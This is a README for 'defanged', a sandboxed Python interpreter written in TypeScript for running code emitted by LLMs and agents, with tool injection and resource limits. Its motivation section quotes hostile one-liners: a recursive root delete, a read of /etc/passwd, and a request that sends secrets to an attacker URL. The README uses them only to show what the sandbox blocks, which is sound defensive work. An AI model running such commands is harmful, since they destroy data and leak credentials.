<p align="center">
  <img src="logo.png" alt="defanged logo" width="600" />
</p>

# defanged

**A sandboxed Python interpreter written in TypeScript.** Safely run Python code emitted by LLMs and agents — no filesystem access, no network access, no escape to the host process, and inject your own functions.

[![license: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![typescript](https://img.shields.io/badge/typescript-5.x-blue.svg)](https://www.typescriptlang.org/)

> **de·fang** _(verb)_ — to render harmless while keeping analyzable. In security tooling, to "defang" a payload is to strip its ability to execute dangerously while preserving its shape. This project does the same to Python.

---

## Why defanged?

LLMs love writing Python. It's the lingua franca of data work, scripting, and most agent toolchains. But handing an agent a real Python runtime is a liability:

- `import os; os.system("rm -rf /")` — full shell access
- `open("/etc/passwd").read()` — arbitrary filesystem reads
- `import requests; requests.get(attacker_url, data=secrets)` — data exfiltration
- `exec(user_input)` — arbitrary code execution

`defanged` executes Python without any of this. There is no module system, no filesystem, no network, no `exec`/`eval`, no `subprocess` — because **none of those exist in the interpreter**. You cannot disable a feature that was never implemented.

The only I/O channel is **tools you explicitly inject from TypeScript**. If you don't provide a tool, the Python code cannot call it.

---

## Install

```bash
npm install defanged
# or
bun add defanged
```

## Quick start

```typescript
import { runPython } from "defanged";

const result = await runPython(`
total = sum([x * 2 for x in range(10) if x % 2 == 0])
f"Total: {total}"
`);

console.log(result); // "Total: 40"
```

### With tool injection

Tools are the only way Python code can reach data outside the interpreter:

```typescript
import { runPython } from "defanged";

const result = await runPython(
  `
transactions = fetch_transactions("2026-04")
total = sum([t['amount'] for t in transactions if t['amount'] > 0])
f"Inflow: {total}"
  `,
  [
    {
      name: "fetch_transactions",
      description: "Fetch transactions for a given month (YYYY-MM).",
      handler: async (month: string) => {
        return await db.transactions.findMany({ where: { month } });
      },
    },
  ],
);
```

Handlers can be synchronous or async. The interpreter awaits async handlers automatically.

### Reusable interpreter

```typescript
import { createInterpreter } from "defanged";

const interpreter = createInterpreter({
  tools: [...],
  onPrint: (msg) => logger.info(msg),
  maxIterations: 10_000, // lower for untrusted input
});

const a = await interpreter.run(codeOne);
const b = await interpreter.run(codeTwo);
```

---

## What's supported

A quick overview — see [`FEATURES.md`](./FEATURES.md) for the authoritative list with TypeScript analogues for every feature.

**Works:** numbers, strings, raw strings (`r"\d+"`), f-strings (including format specs and nested quotes), booleans (with int arithmetic), `None`, lists, tuples, dicts and sets (keys/members can be any hashable value, including tuples — `totals[(month, org)]` works), set literals and operators (`|`, `&`, `-`, `^`), comprehensions (list, dict, set), `if`/`elif`/`else`, `for`/`while` (with `else` clauses), `break`/`continue`/`pass`, `try`/`except`/`finally`, `raise`, function definitions with `*args`/`**kwargs` and defaults, closures, lambdas (including as keyword arguments), decorators, generators (`yield`, `yield from`, `next()`), chained assignment (`x = y = 5`), tuple unpacking, tuple/list lexicographic comparison, semicolon statement separators, chained comparisons (`0 < x < 10`), slicing, `and`/`or`/`not`, bitwise operators, ternary expressions, walrus (`:=`), string/list/dict/set methods, the `datetime` module (`datetime`, `date`, `timedelta` — naive, with a host-configurable clock and session timezone), the `math` module (sqrt, floor/ceil, log family, trig, isclose, `pi`/`inf`/`nan`), the `statistics` module (mean, median, mode, stdev, quantiles), the `re` module (search/match/findall/finditer/sub/split/compile, named groups, flags — JS-RegExp-backed, dialect caveats in `FEATURES.md`), and ~40 built-ins (`len`, `range`, `sum`, `sorted`, `enumerate`, `zip`, `map`, `filter`, `any`, `all`, `print`, `iter`, `next`, `hash`, `id`, etc.).

### Not supported

| Feature | Reason |
|---|---|
| Modules other than `datetime`, `math`, `statistics`, `re` | **Safety.** There is no real module system — imports resolve against a built-in whitelist of pure-computation modules. Nothing importable touches the filesystem, network, or process. Everything else raises `ModuleNotFoundError`. |
| `exec` / `eval` / `compile` | **Safety.** Dynamic code execution would bypass the sandbox. |
| `open` / filesystem I/O | **Safety.** No filesystem access. Data comes in through tools. |
| `__import__` / `globals` / `locals` | **Safety.** Introspection escapes could leak or mutate interpreter state. |
| Network / subprocess | **Safety.** No `os`, `socket`, `subprocess`, `urllib`, or `requests`. |
| `class` definitions | **Not useful for agents.** AI-generated sandbox code is short and procedural — dicts, tuples, and functions cover every practical case. Classes are a code organization tool for larger programs. |
| `with` statement | **Blocked by classes.** Context managers require `__enter__`/`__exit__` methods, and every real-world use case (`open()`, DB connections, locks) involves I/O that the sandbox doesn't have. |
| `async` / `await` | **Not applicable.** The sandbox has no I/O to await. Concurrency is not meaningful in a single-threaded, network-free interpreter. |
| `input()` | **Not applicable.** There is no interactive stdin. Data should be passed in via tools. |
| `str.encode()` / `bytes` type | **Not useful for agents.** Binary data handling is irrelevant in a text-processing sandbox. |
| Default mutable argument sharing | **Intentional deviation.** In CPython, `def f(x=[]):` shares the list across calls — a well-known footgun. defanged creates a fresh default each call, which is safer for sandboxed use. |

The constructs models emit anyway (`class`, `with`, `async`/`await`) fail at parse time with a targeted message — e.g. `class definitions are not supported in this sandbox — use dicts and functions instead` — so an LLM's retry loop converges instead of guessing at a generic `Unexpected token`.

---

## Safety model

`defanged` is safe by _construction_, not by _configuration_. The dangerous Python features simply do not exist in this interpreter — there is no flag to enable them and no module to import them from.

| Attack surface         | Status                                                   |
| ---------------------- | -------------------------------------------------------- |
| Filesystem access      | Absent (`open` is not defined)                           |
| Network access         | Absent (no `urllib`, `requests`, `socket`)               |
| Shell / subprocess     | Absent (no `os`, `subprocess`)                           |
| Dynamic code execution | Absent (no `exec`, `eval`, `compile`, `__import__`)      |
| Module imports         | Absent (no module system)                                |
| Introspection escape   | Absent (no `globals()`, `locals()`, `__dict__`)          |
| Infinite loops / DoS   | Bounded by `maxIterations` (default 5,000,000) and `timeoutMs` (wall-clock, opt-in) |
| Host memory exhaustion | Bounded by `limits` — single-step allocations (`[0] * 10**9`, `"x" * 10**9`, `range(10**9)`, `join`, `ljust`/`center`/`zfill`) fail with a Python `MemoryError` instead of OOMing the process |
| Host CPU exhaustion    | Bounded by iteration limit + optional wall-clock deadline |

Neither `MaxIterationsError` nor `TimeoutError` can be caught from Python — not even by a bare `except:` — so sandboxed code cannot neutralize the host's resource bounds.

### Residual risks (yours to own)

1. **Tool handlers are trust boundaries.** Whatever a tool handler does with its arguments is on you. If a tool runs SQL, parameterize it. If a tool calls out to a system, validate inputs.
2. **Memory bounding is crude, not precise accounting.** The `limits` caps guard the operations that can allocate huge results in one step. Many small allocations across millions of iterations are bounded only indirectly (by `maxIterations`); keep a process-level memory budget for hostile input.
3. **Wall-clock enforcement has gaps.** The `timeoutMs` deadline is checked between operations and after each tool call — it cannot interrupt a single synchronous operation already in flight (e.g. a catastrophically backtracking `re` pattern, or a slow tool handler that never resolves). For hard real-time guarantees, run untrusted code in a worker you can kill.

---

## API

### `runPython(code, tools?, onPrint?)`

One-shot execution. Returns the value of the last expression, or `None` if the code ends in a statement.

### `createInterpreter(options)`

Long-lived interpreter. Options:

- `tools: ToolDefinition[]` — functions callable from Python
- `onPrint: (msg: string) => void` — called for every `print()` invocation
- `maxIterations: number` — loop iteration budget (default 5,000,000)
- `timeoutMs: number` — wall-clock deadline per `run()`, including time spent inside awaited tool handlers (which `maxIterations` cannot bound). Raises a `TimeoutError` that Python code cannot catch. Default: no limit — set one if your host runs on an event loop it can't block indefinitely.
- `limits: { maxStringLength?, maxCollectionSize? }` — allocation caps (defaults: 10,000,000 characters / elements). Exceeding one raises a Python-catchable `MemoryError` instead of OOMing the host. Pass `Infinity` to disable.
- `now: () => number` — clock for `datetime.now()` / `date.today()`, in epoch milliseconds (default `Date.now`)
- `timezone: string` — IANA timezone the sandboxed code appears to run in, e.g. `'Europe/Berlin'` (default `'UTC'`). Affects `datetime.now()`, `date.today()`, and how `fromisoformat()` localizes `Z`/offset-suffixed timestamps; pass the end user's timezone so dates render in their local time. All datetimes stay naive — see `FEATURES.md` for the full model.

### `ToolDefinition`

```typescript
interface ToolDefinition {
  name: string;
  description?: string;
  handler: (...args: any[]) => any | Promise<any>;
  parameters?: ToolParameter[]; // metadata for generateToolsPrompt
  group?: string;               // section heading in generateToolsPrompt
}
```

**Calling convention.** Handlers receive the script's positional arguments (marshalled to plain JS values) followed by **one trailing kwargs object**, which is always present when the call uses keyword arguments and is `{}` for zero-argument calls:

```python
f()           # handler({})
f("a")        # handler("a", {})
f("a", x=1)   # handler("a", { x: 1 })
```

Note the ambiguity: a final positional dict is indistinguishable from kwargs. Prefer keyword-only tools, or put dict parameters first. (A cleaner `(args, kwargs)` signature is planned for 0.4.)

**Errors.** A JS exception thrown (or rejected) by a handler surfaces in Python as a `ToolError` — catchable with `except ToolError`, `except RuntimeError`, or `except Exception` — so scripts can implement fallbacks. The message is `Tool '<name>' failed: <error.message>`.

Return values marshal into Python values: arrays → lists, plain objects → dicts, `null`/`undefined` → `None`, and JS `Date` objects → naive `datetime` values in the session timezone (so timestamp columns from database drivers behave like `datetime.now()` output).

### `generateToolsPrompt(tools, options?)`

Produces a system-prompt fragment describing available tools, for use with Claude / other LLMs. Tools with `parameters` metadata render Python-style signatures with per-argument docs; tools sharing a `group` render under a `##` section heading (useful past ~10 tools); `{ includeLanguageNotes: true }` appends a short description of the supported Python subset so hosts don't each hand-write it.

```typescript
generateToolsPrompt([
  {
    name: "get_sales",
    description: "Fetch sales rows for a region.",
    handler: getSales,
    group: "Data",
    parameters: [
      { name: "region", type: "str", description: "Sales region code" },
      { name: "currency", type: "str", default: '"USD"' },
    ],
  },
], { includeLanguageNotes: true });
// ## Data
// - get_sales(region: str, currency: str = "USD") - Fetch sales rows for a region.
//     region: Sales region code
// ...
```

---

## Architecture

```
source code ──► lexer ──► tokens ──► parser ──► AST ──► interpreter ──► value
                                                              │
                                                              └─► tool handler (TS)
```

- `src/lexer.ts` — tokenizer, including INDENT/DEDENT tracking
- `src/parser.ts` — recursive-descent parser producing the AST
- `src/ast.ts` — AST node types
- `src/interpreter.ts` — tree-walking evaluator
- `src/builtins.ts` — built-in functions and string/list/dict methods
- `src/values.ts` — runtime value types
- `src/errors.ts` — Python-like exception types

---

## Development

```bash
bun install             # install devDependencies
bun test                # run the full suite
bun run test:features   # run the behavioral feature suite
bun run typecheck       # tsc --noEmit
bun run build           # emit dist/
```

Contributions welcome. Two rules:

1. **Never add a capability that widens the safety boundary.** No module system, no `exec`, no filesystem, no network. If you want to expose something to Python code, add it as a tool, not as a built-in.
2. **Match CPython behavior.** When in doubt, open a real Python REPL and observe. The test suite is the spec.

---

## A note on AI-assisted authorship

A substantial portion of this codebase was written with the help of Claude. I'm flagging it up front because transparency matters and because I want to explain why I think this is a reasonable approach here — not a general endorsement, but a case for _this specific kind of project_.

**A Python interpreter is a black box with a very well-defined contract.** The contract is "behave like CPython for the supported subset." That contract is:

- **Externally specified.** Python's semantics are documented, tested, and can be verified against a reference implementation that ships with every major OS. If `defanged` says `int(-3.9) == -3`, I can check that in a real Python REPL in five seconds.
- **Mechanically testable.** Every behavioral claim is a unit test. Given input X, produce output Y. There is very little room for "it works but it's subtly wrong" in a way that tests wouldn't catch — and when there is, the right fix is to add a test, not to re-audit the code by hand.
- **Narrowly scoped.** The code does one thing: interpret a stream of Python tokens and produce values. It does not make network calls, write to disk, or interact with shared state. The blast radius of a bug is "the code returns the wrong answer," not "the code leaks user data."

For projects like this — interpreters, parsers, codecs, protocol implementations, math libraries, anything with a reference spec and deterministic I/O — I believe the honest engineering question is not "who typed this?" but "is the behavior correct, and can you prove it?" The test suite is the proof. If `bun test` passes and the coverage is honest, the implementation is sound whether a human, an AI, or a team of both produced it.

I would not make the same argument about a project where the spec _is_ the code itself — a novel system design, a security-critical protocol, a piece of infrastructure where the blast radius extends beyond its return value. Those warrant human review line by line. `defanged` is not that project.

If you find a case where `defanged` diverges from CPython, please [file an issue](https://github.com/ianjaku/defanged/issues) with a minimal repro. That's the contract.

---

## License

MIT © Ian Jakubek — see [LICENSE](LICENSE).
